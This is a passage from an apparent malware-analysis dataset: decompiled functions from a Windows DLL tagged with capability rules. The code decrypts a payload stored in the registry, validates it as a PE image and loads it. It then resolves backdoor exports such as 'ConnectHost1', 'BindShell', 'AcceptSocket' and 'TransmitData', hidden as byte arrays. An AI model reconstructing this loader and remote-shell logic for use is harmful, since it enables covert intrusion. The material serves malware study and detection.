        "decompiled_code": "\nulong fcn.180020f30(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    ulong uVar3;\n    uint32_t in_stack_00000028;\n    ulong uStack56;\n    int64_t iStack48;\n    uint32_t uStack40;\n    ulong uStack32;\n    int64_t iStack24;\n    \n    uStack56 = 0;\n    uStack32 = fcn.1800020d0(arg1);\n    pcVar2 = fcn.18001e5f0(0x180038958);\n    iVar1 = (*pcVar2)(0xffffffff80000000, uStack32, &uStack56);\n    if (iVar1 == 0) {\n        uStack40 = in_stack_00000028 + 0x35;\n        iStack48 = fcn.180015b40(uStack40);\n        fcn.180023f9c(iStack48, uStack40, arg3, 0x35);\n        iStack24 = iStack48 + 0x35;\n        fcn.180023f9c(iStack24, uStack40, arg4, in_stack_00000028);\n        pcVar2 = fcn.18001e5f0(0x180038968);\n        iVar1 = (*pcVar2)(uStack56, arg2, 0, 3, iStack48, uStack40);\n        if (iVar1 == 0) {\n            pcVar2 = fcn.18001e5f0(0x180038978);\n            (*pcVar2)(uStack56);\n            uVar3 = 1;\n        }\n        else {\n            uVar3 = 0;\n        }\n    }\n    else {\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 410
    },
    "18002107": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.180021070(ulong arg1, int16_t *arg2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    code *pcVar4;\n    int64_t iVar5;\n    uchar *puVar6;\n    uint32_t uStack80;\n    uchar auStack76 [44];\n    int32_t *piStack32;\n    int32_t iStack24;\n    uint32_t uStack20;\n    ulong uStack16;\n    \n    if (*arg2 == 0x5a4d) {\n        piStack32 = arg2 + *(arg2 + 0x1e);\n        if (*piStack32 == 0x4550) {\n            iVar1 = *(piStack32 + 6);\n            uStack80 = 0;\n            puVar6 = auStack76;\n            for (iVar5 = 0x2c; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            iVar5 = fcn.18001e5f0(0x180038988);\n            if (iVar5 == 0) {\n                pcVar4 = fcn.18001e5f0(0x1800389b8);\n                (*pcVar4)(&uStack80);\n            }\n            else {\n                pcVar4 = fcn.18001e5f0(0x1800389a0);\n                (*pcVar4)(&uStack80);\n            }\n            uStack20 = uStack80 & 0xffff;\n            if (uStack20 == 0) {\n                if (iVar1 == 0x10b) {\n                    uVar3 = 1;\n                }\n                else {\n                    uVar3 = 0;\n                }\n            }\n            else if ((uStack20 == 6) || (uStack20 == 9)) {\n                iVar5 = fcn.18001e5f0(0x1800389c8);\n                if (iVar5 == 0) {\n                    uVar3 = 0;\n                }\n                else {\n                    iStack24 = 0;\n                    pcVar4 = fcn.18001e5f0(0x1800389e8);\n                    uStack16 = (*pcVar4)();\n                    pcVar4 = fcn.18001e5f0(0x1800389d8);\n                    iVar2 = (*pcVar4)(uStack16, &iStack24);\n                    if (iVar2 == 0) {\n                        uVar3 = 0;\n                    }\n                    else {\n                        if (iStack24 == 0) {\n                            if (iVar1 != 0x20b) {\n                                return 0;\n                            }\n                        }\n                        else if (iVar1 != 0x10b) {\n                            return 0;\n                        }\n                        uVar3 = 1;\n                    }\n                }\n            }\n            else {\n                uVar3 = 0;\n            }\n        }\n        else {\n            uVar3 = 0;\n        }\n    }\n    else {\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 693
    },
    "18002121": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180021210(ulong arg1, ulong arg2, uchar *arg3, ulong *arg4)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    uchar *puVar6;\n    char *pcVar7;\n    uint32_t *in_stack_00000028;\n    uint *in_stack_00000030;\n    uchar auStack264 [32];\n    int64_t iStack232;\n    uint32_t *puStack224;\n    char acStack208 [40];\n    uint uStack168;\n    int32_t iStack164;\n    ulong uStack160;\n    uchar auStack152 [8];\n    uchar auStack144 [4];\n    uint32_t uStack140;\n    uint uStack136;\n    int64_t iStack132;\n    uchar auStack124 [36];\n    int64_t iStack88;\n    uchar auStack80 [8];\n    ulong uStack72;\n    uint32_t uStack64;\n    uchar uStack60;\n    uchar uStack59;\n    uchar uStack58;\n    uchar uStack57;\n    ulong uStack56;\n    ulong uStack48;\n    uint64_t uStack40;\n    \n    uStack56 = 0xfffffffffffffffe;\n    uStack40 = *0x180040248 ^ auStack264;\n    iStack164 = 0;\n    uStack160 = 0;\n    uStack48 = fcn.1800020d0(arg1);\n    pcVar3 = fcn.18001e5f0(0x180038a00);\n    iStack164 = (*pcVar3)(0xffffffff80000000, uStack48, &uStack160);\n    if (iStack164 == 0) {\n        uStack168 = 3;\n        uStack64 = 0;\n        pcVar3 = fcn.18001e5f0(0x180038a10);\n        puStack224 = &uStack64;\n        iStack232 = 0;\n        iStack164 = (*pcVar3)(uStack160, arg2, 0, &uStack168);\n        if (iStack164 == 0) {\n            if (uStack64 == 0) {\n                pcVar3 = fcn.18001e5f0(0x180038a40);\n                (*pcVar3)(uStack160);\n                *in_stack_00000030 = 0x67;\n            }\n            else {\n                uStack168 = 3;\n                iStack88 = fcn.180015b40(uStack64);\n                pcVar3 = fcn.18001e5f0(0x180038a50);\n                puStack224 = &uStack64;\n                iStack232 = iStack88;\n                iStack164 = (*pcVar3)(uStack160, arg2, 0, &uStack168);\n                if (iStack164 == 0) {\n                    if (uStack64 == 0) {\n                        fcn.180015b80(&iStack88);\n                        pcVar3 = fcn.18001e5f0(0x180038a80);\n                        (*pcVar3)(uStack160);\n                        *in_stack_00000030 = 0x67;\n                    }\n                    else {\n                        pcVar3 = fcn.18001e5f0(0x180038a90);\n                        (*pcVar3)(uStack160);\n                        puVar6 = auStack144;\n                        for (iVar4 = 0x35; iVar4 != 0; iVar4 = iVar4 + -1) {\n                            *puVar6 = 0;\n                            puVar6 = puVar6 + 1;\n                        }\n                        fcn.180023f9c(auStack144, 0x35, iStack88, 0x35);\n                        if (uStack64 == iStack132 + 0x35U) {\n                            uStack72 = fcn.180015b40(CONCAT44(uStack136, uStack140));\n                            fcn.18000eb30(auStack80);\n                            iVar2 = fcn.180002fc0(auStack80, iStack88 + 0x35, uStack72);\n                            if (iVar2 == 0) {\n                                fcn.180015b80(&iStack88);\n                                fcn.180015b80(&uStack72);\n                                *in_stack_00000030 = 0x69;\n                                uStack60 = 0;\n                                fcn.18000bcf0(auStack80);\n                            }\n                            else {\n                                fcn.180015b80(&iStack88);\n                                pcVar7 = acStack208;\n                                for (iVar4 = 0x21; iVar4 != 0; iVar4 = iVar4 + -1) {\n                                    *pcVar7 = '\\0';\n                                    pcVar7 = pcVar7 + 1;\n                                }\n                                fcn.180007a60(auStack152);\n                                fcn.180009740(auStack152, uStack72, uStack140, acStack208);\n                                uVar5 = 0xffffffffffffffff;\n                                pcVar7 = acStack208;\n                                do {\n                                    if (uVar5 == 0) break;\n                                    uVar5 = uVar5 - 1;\n                                    cVar1 = *pcVar7;\n                                    pcVar7 = pcVar7 + 1;\n                                } while (cVar1 != '\\0');\n                                iVar2 = fcn.180030ca8(auStack124, acStack208, ~uVar5 - 1);\n                                if (iVar2 == 0) {\n                                    cVar1 = fcn.180021070(arg1, uStack72);\n                                    if (cVar1 == '\\0') {\n                                        fcn.180015b80(&iStack88);\n                                        fcn.180015b80(&uStack72);\n                                        *in_stack_00000030 = 0x68;\n                                        uStack58 = 0;\n                                        fcn.180007ac0(auStack152);\n                                        fcn.18000bcf0(auStack80);\n                                    }\n                                    else {\n                                        puVar6 = auStack144;\n                                        for (iVar4 = 0x35; iVar4 != 0; iVar4 = iVar4 + -1) {\n                                            *arg3 = *puVar6;\n                                            puVar6 = puVar6 + 1;\n                                            arg3 = arg3 + 1;\n                                        }\n                                        *arg4 = uStack72;\n                                        *in_stack_00000028 = uStack140;\n                                        *in_stack_00000030 = 0;\n                                        uStack57 = 1;\n                                        fcn.180007ac0(auStack152);\n                                        fcn.18000bcf0(auStack80);\n                                    }\n                                }\n                                else {\n                                    fcn.180015b80(&iStack88);\n                                    fcn.180015b80(&uStack72);\n                                    *in_stack_00000030 = 0x69;\n                                    uStack59 = 0;\n                                    fcn.180007ac0(auStack152);\n                                    fcn.18000bcf0(auStack80);\n                                }\n                            }\n                        }\n                        else {\n                            fcn.180015b80(&iStack88);\n                            *in_stack_00000030 = 0x69;\n                        }\n                    }\n                }\n                else {\n                    fcn.180015b80(&iStack88);\n                    pcVar3 = fcn.18001e5f0(0x180038a70);\n                    (*pcVar3)(uStack160);\n                    *in_stack_00000030 = 0x67;\n                }\n            }\n        }\n        else {\n            pcVar3 = fcn.18001e5f0(0x180038a30);\n            (*pcVar3)(uStack160);\n            *in_stack_00000030 = 0x67;\n        }\n    }\n    else {\n        *in_stack_00000030 = 0x67;\n    }\n    fcn.180023980(uStack40 ^ auStack264);\n    return;\n}\n",
        "token_count": 1756
    },
    "18002172": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180021720(ulong arg1, uint *arg2)\n\n{\n    char cVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    uchar *puVar4;\n    uchar auStack232 [32];\n    uint32_t *puStack200;\n    uint *puStack192;\n    uchar auStack184 [48];\n    uint *apuStack136 [2];\n    uchar auStack120 [56];\n    int64_t iStack64;\n    uint uStack56;\n    uint uStack52;\n    ulong *puStack48;\n    uint32_t uStack40;\n    uint uStack36;\n    uint uStack32;\n    ulong uStack24;\n    uint64_t uStack16;\n    \n    uStack24 = 0xfffffffffffffffe;\n    uStack16 = *0x180040248 ^ auStack232;\n    puVar4 = auStack120;\n    for (iVar3 = 0x35; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    iStack64 = 0;\n    uStack40 = 0;\n    apuStack136[0] = fcn.180015b40(0xc);\n    *apuStack136[0] = *arg2;\n    uVar2 = fcn.180015b40(0x4000);\n    *(apuStack136[0] + 1) = uVar2;\n    fcn.180001590(*(apuStack136[0] + 1), 0x4000, *(arg2 + 1));\n    fcn.180001000(auStack184, *(arg2 + 1));\n    uStack52 = fcn.180001180(auStack184);\n    puStack48 = fcn.180001190(auStack184);\n    uStack56 = 0;\n    puStack192 = &uStack56;\n    puStack200 = &uStack40;\n    cVar1 = fcn.180021210(arg1, *puStack48, auStack120, &iStack64);\n    if ((cVar1 == '\\0') || (iStack64 == 0)) {\n        if (*(apuStack136[0] + 1) != 0) {\n            fcn.180015b80(apuStack136[0] + 1);\n        }\n        if (apuStack136[0] != NULL) {\n            fcn.180015b80(apuStack136);\n        }\n        if (iStack64 != 0) {\n            fcn.180015b80(&iStack64);\n        }\n        uStack32 = 0;\n        fcn.180001120(auStack184);\n    }\n    else {\n        fcn.180021f40(iStack64, uStack40, apuStack136[0]);\n        fcn.180015b80(apuStack136[0] + 1);\n        fcn.180015b80(apuStack136);\n        fcn.180015b80(&iStack64);\n        uStack36 = 1;\n        fcn.180001120(auStack184);\n    }\n    fcn.180023980(uStack16 ^ auStack232);\n    return;\n}\n",
        "token_count": 717
    },
    "180021f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000180021ff1)\n\nvoid fcn.180021f40(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uchar auStack88 [32];\n    ulong uStack56;\n    code *pcStack48;\n    uchar uStack32;\n    uchar uStack31;\n    uchar uStack30;\n    uchar uStack29;\n    uchar uStack28;\n    uchar uStack27;\n    uchar uStack26;\n    uchar uStack25;\n    uchar uStack24;\n    uchar uStack23;\n    uint64_t uStack16;\n    \n    uStack16 = *0x180040248 ^ auStack88;\n    uStack56 = 0;\n    uStack56 = fcn.18000a610(arg1, arg2);\n    uStack32 = 0x43;\n    uStack31 = 0x6f;\n    uStack30 = 0x6e;\n    uStack29 = 0x73;\n    uStack28 = 0x74;\n    uStack27 = 0x72;\n    uStack26 = 0x75;\n    uStack25 = 99;\n    uStack24 = 0x74;\n    uStack23 = 0;\n    pcStack48 = fcn.18000acf0(uStack56, &uStack32);\n    if (pcStack48 != NULL) {\n        (*pcStack48)(arg3);\n    }\n    fcn.18000af00(uStack56);\n    uStack56 = 0;\n    fcn.180023980(uStack16 ^ auStack88);\n    return;\n}\n",
        "token_count": 351
    },
    "18002201": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180022010(int64_t arg1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    char in_DL;\n    uint *arg2;\n    int16_t *piVar7;\n    uchar *puVar8;\n    uchar auStack840 [32];\n    uint32_t *puStack808;\n    int32_t *piStack800;\n    uchar auStack784 [40];\n    uchar auStack744 [40];\n    ushort uStack704;\n    ushort uStack702;\n    ushort uStack700;\n    ushort uStack698;\n    ushort uStack696;\n    ushort uStack694;\n    ushort uStack692;\n    ushort uStack690;\n    ushort uStack688;\n    ushort uStack686;\n    ushort uStack684;\n    ushort uStack682;\n    ushort uStack680;\n    ushort uStack678;\n    ushort uStack676;\n    ushort uStack674;\n    ushort uStack672;\n    ushort uStack670;\n    ushort uStack668;\n    ushort uStack666;\n    uchar auStack664 [48];\n    uint *puStack616;\n    uchar uStack608;\n    uchar uStack607;\n    uchar uStack606;\n    uchar uStack605;\n    uchar uStack604;\n    uchar uStack603;\n    uchar uStack602;\n    uchar uStack601;\n    uchar uStack600;\n    uchar uStack599;\n    uchar uStack598;\n    uchar uStack597;\n    uchar uStack596;\n    uchar uStack595;\n    uchar uStack594;\n    uchar uStack593;\n    uchar uStack592;\n    uchar uStack591;\n    uchar uStack590;\n    uchar auStack584 [56];\n    uchar auStack528 [8];\n    int16_t **ppiStack520;\n    int64_t iStack512;\n    uint uStack504;\n    uint uStack500;\n    int32_t aiStack496 [2];\n    ulong *puStack488;\n    uchar auStack480 [48];\n    uint32_t auStack432 [2];\n    int16_t **ppiStack424;\n    uchar auStack416 [48];\n    code *pcStack368;\n    uchar uStack360;\n    uchar uStack359;\n    uchar uStack358;\n    uchar uStack357;\n    uchar uStack356;\n    uchar uStack355;\n    uchar uStack354;\n    uchar uStack353;\n    uchar uStack352;\n    uchar uStack351;\n    uchar uStack344;\n    uchar uStack343;\n    uchar uStack342;\n    uchar uStack341;\n    uchar uStack340;\n    uchar uStack339;\n    uchar uStack338;\n    uchar uStack337;\n    uchar uStack336;\n    uchar uStack335;\n    uchar uStack334;\n    uchar uStack333;\n    uchar uStack332;\n    uchar uStack331;\n    uchar uStack330;\n    uchar uStack329;\n    uchar uStack328;\n    uchar uStack327;\n    uchar uStack326;\n    uchar uStack325;\n    uchar uStack324;\n    uchar uStack323;\n    uchar uStack322;\n    uchar uStack320;\n    uchar uStack319;\n    uchar uStack318;\n    uchar uStack317;\n    uchar uStack316;\n    uchar uStack315;\n    uchar uStack314;\n    uchar uStack313;\n    uchar uStack312;\n    uchar uStack311;\n    uchar uStack310;\n    uchar uStack309;\n    uchar uStack308;\n    uchar uStack307;\n    uchar uStack306;\n    uchar uStack305;\n    uchar uStack304;\n    uchar uStack303;\n    uchar uStack302;\n    uchar uStack301;\n    uchar uStack300;\n    uchar uStack296;\n    uchar uStack295;\n    uchar uStack294;\n    uchar uStack293;\n    uchar uStack292;\n    uchar uStack291;\n    uchar uStack290;\n    uchar uStack289;\n    uchar uStack288;\n    uchar uStack287;\n    uchar uStack280;\n    uchar uStack279;\n    uchar uStack278;\n    uchar uStack277;\n    uchar uStack276;\n    uchar uStack272;\n    uchar uStack271;\n    uchar uStack270;\n    uchar uStack269;\n    uchar uStack268;\n    uchar uStack267;\n    uchar uStack266;\n    uchar uStack265;\n    uchar uStack264;\n    uchar uStack263;\n    uchar uStack262;\n    uchar uStack261;\n    uchar uStack260;\n    uchar uStack259;\n    uchar uStack258;\n    uchar uStack257;\n    uchar uStack256;\n    uchar uStack255;\n    uchar uStack254;\n    uchar uStack248;\n    uchar uStack247;\n    uchar uStack246;\n    uchar uStack245;\n    uchar uStack244;\n    uchar uStack243;\n    uchar uStack242;\n    uchar uStack241;\n    uchar uStack240;\n    uchar uStack239;\n    uchar uStack238;\n    uchar uStack237;\n    uchar uStack236;\n    uchar uStack235;\n    uchar uStack234;\n    uchar uStack233;\n    uchar uStack232;\n    uchar uStack224;\n    uchar uStack223;\n    uchar uStack222;\n    uchar uStack221;\n    uchar uStack220;\n    uchar uStack219;\n    uchar uStack218;\n    uchar uStack217;\n    uchar uStack216;\n    uchar uStack215;\n    uchar uStack214;\n    uchar uStack213;\n    uchar uStack212;\n    uchar uStack211;\n    uchar uStack210;\n    uchar uStack209;\n    uchar uStack208;\n    uchar uStack207;\n    uchar uStack206;\n    uchar uStack200;\n    uchar uStack199;\n    uchar uStack198;\n    uchar uStack197;\n    uchar uStack196;\n    uchar uStack192;\n    uchar uStack191;\n    uchar uStack190;\n    uchar uStack189;\n    uchar uStack188;\n    uchar uStack187;\n    uchar uStack186;\n    uchar uStack185;\n    uchar uStack184;\n    uchar uStack183;\n    uchar uStack182;\n    uchar uStack181;\n    uchar uStack180;\n    uchar uStack176;\n    uchar uStack175;\n    uchar uStack174;\n    uchar uStack173;\n    uchar uStack172;\n    uchar uStack171;\n    uchar uStack170;\n    uchar uStack169;\n    uchar uStack168;\n    uchar uStack167;\n    uchar uStack166;\n    uchar uStack165;\n    uchar uStack164;\n    uchar uStack163;\n    uchar uStack162;\n    uchar uStack161;\n    uchar uStack160;\n    uchar uStack159;\n    uchar uStack158;\n    uchar uStack157;\n    uchar uStack152;\n    uchar uStack151;\n    uchar uStack150;\n    uchar uStack149;\n    uchar uStack148;\n    uchar uStack147;\n    uchar uStack146;\n    uchar uStack145;\n    uchar uStack144;\n    uchar uStack143;\n    uchar uStack142;\n    uchar uStack141;\n    uchar uStack140;\n    uchar uStack136;\n    uchar uStack135;\n    char cStack134;\n    uchar auStack128 [40];\n    uchar *puStack88;\n    uchar uStack80;\n    uchar uStack79;\n    uchar uStack78;\n    uchar uStack77;\n    uchar uStack76;\n    uchar uStack75;\n    uchar uStack74;\n    uchar uStack73;\n    uchar uStack72;\n    uchar uStack71;\n    uchar uStack70;\n    uchar uStack69;\n    uchar uStack68;\n    uchar uStack67;\n    uchar uStack66;\n    uchar uStack65;\n    ulong uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    ulong uStack40;\n    uint32_t uStack32;\n    uint64_t uStack24;\n    \n    uStack64 = 0xfffffffffffffffe;\n    uStack24 = *0x180040248 ^ auStack840;\n    puStack616 = fcn.180015b40(0xc);\n    *puStack616 = 0xffffffff;\n    uVar4 = fcn.180015b40(0x4000);\n    *(puStack616 + 1) = uVar4;\n    uStack704 = 0x53;\n    uStack702 = 0x65;\n    uStack700 = 0x72;\n    uStack698 = 0x76;\n    uStack696 = 0x65;\n    uStack694 = 0x72;\n    uStack692 = 0x42;\n    uStack690 = 0x61;\n    uStack688 = 0x73;\n    uStack686 = 0x65;\n    uStack684 = 0x20;\n    uStack682 = 0x2d;\n    uStack680 = 0x53;\n    uStack678 = 0x74;\n    uStack676 = 0x61;\n    uStack674 = 0x72;\n    uStack672 = 0x74;\n    uStack670 = 0x75;\n    uStack668 = 0x70;\n    uStack666 = 0;\n    fcn.180001590(*(puStack616 + 1), 0x4000, &uStack704);\n    fcn.180001000(auStack480, *(puStack616 + 1));\n    uStack504 = fcn.180001180(auStack480);\n    ppiStack520 = fcn.180001190(auStack480);\n    fcn.180007a60(auStack528);\n    uVar5 = 0xffffffffffffffff;\n    piVar7 = *ppiStack520;\n    do {\n        if (uVar5 == 0) break;\n        uVar5 = uVar5 - 1;\n        iVar1 = *piVar7;\n        piVar7 = piVar7 + 1;\n    } while (iVar1 != 0);\n    fcn.180009740(auStack528, *ppiStack520, (~uVar5 - 1) * 2 & 0xffffffff, auStack744);\n    aiStack496[0] = 0;\n    cVar2 = fcn.1800208c0(arg1, 0xffffffffffffffff, *ppiStack520, aiStack496);\n    if (cVar2 == '\\0') {\n        if (aiStack496[0] == 0x67) {\n            uVar5 = 0xffffffffffffffff;\n            piVar7 = *ppiStack520;\n            do {\n                if (uVar5 == 0) break;\n                uVar5 = uVar5 - 1;\n                iVar1 = *piVar7;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n            if (1 < ~uVar5 - 1) {\n                uVar5 = 0xffffffffffffffff;\n                piVar7 = *ppiStack520;\n                do {\n                    if (uVar5 == 0) break;\n                    uVar5 = uVar5 - 1;\n                    iVar1 = *piVar7;\n                    piVar7 = piVar7 + 1;\n                } while (iVar1 != 0);\n                iVar3 = fcn.180031b40(*ppiStack520 + (~uVar5 - 3), 0x1800388fc);\n                if (iVar3 != 0) {\n                    uVar5 = 0xffffffffffffffff;\n                    piVar7 = *ppiStack520;\n                    do {\n                        if (uVar5 == 0) break;\n                        uVar5 = uVar5 - 1;\n                        iVar1 = *piVar7;\n                        piVar7 = piVar7 + 1;\n                    } while (iVar1 != 0);\n                    iVar3 = fcn.180031b40(*ppiStack520 + (~uVar5 - 3), 0x180038924);\n                    if (iVar3 != 0) {\n                        cVar2 = fcn.18001efd0(arg1, puStack616);\n                        if (cVar2 != '\\0') {\n                            fcn.180001000(auStack416, *(puStack616 + 1));\n                            ppiStack424 = fcn.180001190(auStack416);\n                            fcn.1800011f0(auStack744, 0x21);\n                            uVar5 = 0xffffffffffffffff;\n                            piVar7 = *ppiStack424;\n                            do {\n                                if (uVar5 == 0) break;\n                                uVar5 = uVar5 - 1;\n                                iVar1 = *piVar7;\n                                piVar7 = piVar7 + 1;\n                            } while (iVar1 != 0);\n                            fcn.180009740(auStack528, *ppiStack424, (~uVar5 - 1) * 2 & 0xffffffff, auStack744);\n                            cVar2 = fcn.1800208c0(arg1, 0xffffffffffffffff, *ppiStack424, aiStack496);\n                            if (cVar2 == '\\0') {\n                                uStack136 = 0;\n                                fcn.180001120(auStack416);\n                                fcn.180007ac0(auStack528);\n                                fcn.180001120(auStack480);\n                                goto code_r0x000180023290;\n                            }\n                            fcn.180001120(auStack416);\n                        }\n                        goto code_r0x000180022477;\n                    }\n                }\n            }\n        }\n        uStack135 = 0;\n        fcn.180007ac0(auStack528);\n        fcn.180001120(auStack480);\n    }\n    else {\ncode_r0x000180022477:\n        puStack88 = auStack128;\n        uStack56 = fcn.18000b740(puStack88, auStack744);\n        uStack48 = fcn.18000e140(auStack784, uStack56);\n        uStack40 = uStack48;\n        uVar4 = fcn.1800020d0(uStack48);\n        arg2 = puStack616;\n        cVar2 = fcn.18001f3e0(arg1, puStack616, uVar4);\n        cStack134 = cVar2 == '\\0';\n        uStack32 = cStack134;\n        fcn.180001ef0(auStack784, arg2);\n        if (cStack134 == '\\0') {\n            puVar8 = auStack584;\n            for (iVar6 = 0x35; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            iStack512 = 0;\n            auStack432[0] = 0;\n            fcn.180001000(auStack664, *(puStack616 + 1));\n            uStack500 = fcn.180001180(auStack664);\n            puStack488 = fcn.180001190(auStack664);\n            aiStack496[0] = 0;\n            piStack800 = aiStack496;\n            puStack808 = auStack432;\n            cVar2 = fcn.180021210(arg1, *puStack488, auStack584, &iStack512);\n            if (cVar2 == '\\0') {\n                uStack79 = 0;\n                fcn.180001120(auStack664);\n                fcn.180007ac0(auStack528);\n                fcn.180001120(auStack480);\n            }\n            else if (iStack512 == 0) {\n                uStack78 = 0;\n                fcn.180001120(auStack664);\n                fcn.180007ac0(auStack528);\n                fcn.180001120(auStack480);\n            }\n            else {\n                uVar4 = fcn.18000a610(iStack512, auStack432[0]);\n                *(arg1 + 0x28) = uVar4;\n                if (*(arg1 + 0x28) == 0) {\n                    uStack77 = 0;\n                    fcn.180001120(auStack664);\n                    fcn.180007ac0(auStack528);\n                    fcn.180001120(auStack480);\n                }\n                else {\n                    if (in_DL != '\\0') {\n                        uStack360 = 0x43;\n                        uStack359 = 0x6f;\n                        uStack358 = 0x6e;\n                        uStack357 = 0x73;\n                        uStack356 = 0x74;\n                        uStack355 = 0x72;\n                        uStack354 = 0x75;\n                        uStack353 = 99;\n                        uStack352 = 0x74;\n                        uStack351 = 0;\n                        pcStack368 = fcn.18000acf0(*(arg1 + 0x28), &uStack360);\n                        if (pcStack368 != NULL) {\n                            (*pcStack368)(puStack616);\n                        }\n                    }\n                    if (in_DL != '\\0') {\n                        uStack192 = 0x43;\n                        uStack191 = 0x6f;\n                        uStack190 = 0x6e;\n                        uStack189 = 0x6e;\n                        uStack188 = 0x65;\n                        uStack187 = 99;\n                        uStack186 = 0x74;\n                        uStack185 = 0x48;\n                        uStack184 = 0x6f;\n                        uStack183 = 0x73;\n                        uStack182 = 0x74;\n                        uStack181 = 0x31;\n                        uStack180 = 0;\n                        *0x18004ac50 = fcn.18000acf0(*(arg1 + 0x28), &uStack192);\n                        if (*0x18004ac50 == 0) {\n                            uStack76 = 0;\n                            fcn.180001120(auStack664);\n                            fcn.180007ac0(auStack528);\n                            fcn.180001120(auStack480);\n                            goto code_r0x000180023290;\n                        }\n                        uStack248 = 0x46;\n                        uStack247 = 0x6f;\n                        uStack246 = 0x72;\n                        uStack245 = 99;\n                        uStack244 = 0x65;\n                        uStack243 = 0x43;\n                        uStack242 = 0x6c;\n                        uStack241 = 0x6f;\n                        uStack240 = 0x73;\n                        uStack239 = 0x65;\n                        uStack238 = 0x53;\n                        uStack237 = 0x6f;\n                        uStack236 = 99;\n                        uStack235 = 0x6b;\n                        uStack234 = 0x65;\n                        uStack233 = 0x74;\n                        uStack232 = 0;\n                        *0x18004ac58 = fcn.18000acf0(*(arg1 + 0x28), &uStack248);\n                        if (*0x18004ac58 == 0) {\n                            uStack75 = 0;\n                            fcn.180001120(auStack664);\n                            fcn.180007ac0(auStack528);\n                            fcn.180001120(auStack480);\n                            goto code_r0x000180023290;\n                        }\n                        uStack280 = 0x52;\n                        uStack279 = 0x65;\n                        uStack278 = 99;\n                        uStack277 = 0x76;\n                        uStack276 = 0;\n                        *0x18004ac60 = fcn.18000acf0(*(arg1 + 0x28), &uStack280);\n                        if (*0x18004ac60 == 0) {\n                            uStack74 = 0;\n                            fcn.180001120(auStack664);\n                            fcn.180007ac0(auStack528);\n                            fcn.180001120(auStack480);\n                            goto code_r0x000180023290;\n                        }\n                        uStack200 = 0x53;\n                        uStack199 = 0x65;\n                        uStack198 = 0x6e;\n                        uStack197 = 100;\n                        uStack196 = 0;\n                        *0x18004ac68 = fcn.18000acf0(*(arg1 + 0x28), &uStack200);\n                        if (*0x18004ac68 == 0) {\n                            uStack73 = 0;\n                            fcn.180001120(auStack664);\n                            fcn.180007ac0(auStack528);\n                            fcn.180001120(auStack480);\n                            goto code_r0x000180023290;\n                        }\n                        uStack296 = 0x42;\n                        uStack295 = 0x69;\n                        uStack294 = 0x6e;\n                        uStack293 = 100;\n                        uStack292 = 0x53;\n                        uStack291 = 0x68;\n                        uStack290 = 0x65;\n                        uStack289 = 0x6c;\n                        uStack288 = 0x6c;\n                        uStack287 = 0;\n                        *0x18004ac70 = fcn.18000acf0(*(arg1 + 0x28), &uStack296);\n                        if (*0x18004ac70 == 0) {\n                            uStack72 = 0;\n                            fcn.180001120(auStack664);\n                            fcn.180007ac0(auStack528);\n                            fcn.180001120(auStack480);\n                            goto code_r0x000180023290;\n                        }\n                        uStack152 = 0x41;\n                        uStack151 = 99;\n                        uStack150 = 99;\n                        uStack149 = 0x65;\n                        uStack148 = 0x70;\n                        uStack147 = 0x74;\n                        uStack146 = 0x53;\n                        uStack145 = 0x6f;\n                        uStack144 = 99;\n                        uStack143 = 0x6b;\n                        uStack142 = 0x65;\n                        uStack141 = 0x74;\n                        uStack140 = 0;\n                        *0x18004ac78 = fcn.18000acf0(*(arg1 + 0x28), &uStack152);\n                        if (*0x18004ac78 == 0) {\n                            uStack71 = 0;\n                            fcn.180001120(auStack664);\n                            fcn.180007ac0(auStack528);\n                            fcn.180001120(auStack480);\n                            goto code_r0x000180023290;\n                        }\n                        uStack272 = 0x54;\n                        uStack271 = 0x72;\n                        uStack270 = 0x61;\n                        uStack269 = 0x6e;\n                        uStack268 = 0x73;\n                        uStack267 = 0x6d;\n                        uStack266 = 0x69;\n                        uStack265 = 0x74;\n                        uStack264 = 0x44;\n                        uStack263 = 0x61;\n                        uStack262 = 0x74;\n                        uStack261 = 0x61;\n                        uStack260 = 